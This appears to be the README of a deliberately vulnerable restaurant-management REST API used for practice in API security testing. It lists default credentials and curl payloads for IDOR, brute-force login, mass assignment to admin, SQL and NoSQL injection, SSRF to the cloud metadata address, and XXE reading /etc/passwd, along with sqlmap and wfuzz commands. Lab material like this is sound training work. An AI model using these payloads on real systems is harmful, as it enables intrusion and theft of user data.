# DVRestaurant - Damn Vulnerable Restaurant API

## Overview
DVRestaurant is a vulnerable REST API simulating a restaurant management system, designed to practice API security testing and exploitation.

## Quick Start

**Access URL**: http://localhost:8083

**API Base**: http://localhost:8083/api

**Default Credentials**:
- Admin: `admin@restaurant.com` / `admin123`
- User: `user@restaurant.com` / `user123`
- Chef: `chef@restaurant.com` / `chef123`

## API Endpoints

### Authentication
- `POST /api/auth/login` - User login
- `POST /api/auth/register` - User registration
- `POST /api/auth/logout` - Logout

### Menu Management
- `GET /api/menu` - Get all menu items
- `GET /api/menu/{id}` - Get specific item
- `POST /api/menu` - Add menu item (chef only)
- `PUT /api/menu/{id}` - Update menu item
- `DELETE /api/menu/{id}` - Delete menu item

### Orders
- `GET /api/orders` - Get all orders
- `GET /api/orders/{id}` - Get specific order
- `POST /api/orders` - Create new order
- `PUT /api/orders/{id}/status` - Update order status

### Users
- `GET /api/users` - Get all users (admin only)
- `GET /api/users/{id}` - Get user details
- `PUT /api/users/{id}` - Update user
- `DELETE /api/users/{id}` - Delete user

## Vulnerabilities

### 1. Broken Object Level Authorization (BOLA/IDOR)
```bash
# Access another user's order
curl http://localhost:8083/api/orders/1 \
  -H "Authorization: Bearer YOUR_TOKEN"

# Modify another user's profile
curl -X PUT http://localhost:8083/api/users/2 \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email":"hacked@evil.com"}'
```

### 2. Broken Authentication
```bash
# Weak JWT secret allows token forging
# JWT secret is often 'secret' or predictable

# No password complexity requirements
curl -X POST http://localhost:8083/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"1"}'
```

### 3. Excessive Data Exposure
```bash
# User listing exposes sensitive data
curl http://localhost:8083/api/users \
  -H "Authorization: Bearer ADMIN_TOKEN"

# Returns passwords, internal IDs, etc.
```

### 4. Lack of Rate Limiting
```bash
# Brute force login
for i in {1..1000}; do
  curl -X POST http://localhost:8083/api/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@restaurant.com","password":"pass'$i'"}'
done
```

### 5. Broken Function Level Authorization
```bash
# Regular user accessing admin functions
curl -X POST http://localhost:8083/api/menu \
  -H "Authorization: Bearer USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"Evil Dish","price":9999}'
```

### 6. Mass Assignment
```bash
# Set role during registration
curl -X POST http://localhost:8083/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"email":"hacker@evil.com","password":"hack","role":"admin","verified":true}'

# Modify order total
curl -X POST http://localhost:8083/api/orders \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"items":[{"id":1,"quantity":10}],"total":0.01}'
```

### 7. SQL Injection
```bash
# In search parameters
curl "http://localhost:8083/api/menu?search=' OR '1'='1"

# In order filters
curl "http://localhost:8083/api/orders?status=pending' UNION SELECT * FROM users--"
```

### 8. NoSQL Injection
```bash
# If using MongoDB
curl http://localhost:8083/api/menu \
  -H "Content-Type: application/json" \
  -d '{"price":{"$gt":0}}'
```

### 9. Server-Side Request Forgery (SSRF)
```bash
# In image upload or URL processing
curl -X POST http://localhost:8083/api/menu/1/image \
  -H "Authorization: Bearer CHEF_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"imageUrl":"http://169.254.169.254/latest/meta-data/"}'
```

### 10. XML External Entity (XXE)
```bash
# If XML parsing is enabled
curl -X POST http://localhost:8083/api/orders/import \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]>
<order><item>&test;</item></order>'
```

## Privilege Escalation Path

1. Register as normal user
2. Use IDOR to view admin orders/data
3. Use mass assignment to elevate privileges
4. Access admin endpoints
5. Extract all user data
6. Modify system settings

## Testing Tools

### Postman Collection
```json
{
  "info": {
    "name": "DVRestaurant API",
    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
  },
  "item": [
    {
      "name": "Login",
      "request": {
        "method": "POST",
        "url": "{{baseUrl}}/api/auth/login",
        "body": {
          "mode": "raw",
          "raw": "{\"email\":\"admin@restaurant.com\",\"password\":\"admin123\"}"
        }
      }
    }
  ]
}
```

### Automated Testing
```bash
# Using wfuzz for fuzzing
wfuzz -c -z file,/usr/share/wordlists/common.txt \
  -H "Authorization: Bearer TOKEN" \
  http://localhost:8083/api/FUZZ

# Using SQLMap
sqlmap -u "http://localhost:8083/api/menu?search=test" \
  --headers="Authorization: Bearer TOKEN"
```

## Defense Mechanisms (What's Missing)
- ❌ Proper authorization checks
- ❌ Rate limiting
- ❌ Input validation
- ❌ Parameterized queries
- ❌ Secure session management
- ❌ API versioning
- ❌ Audit logging

## Additional Resources
- [REST Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html)
- [API Security Best Practices](https://roadmap.sh/best-practices/api-security) 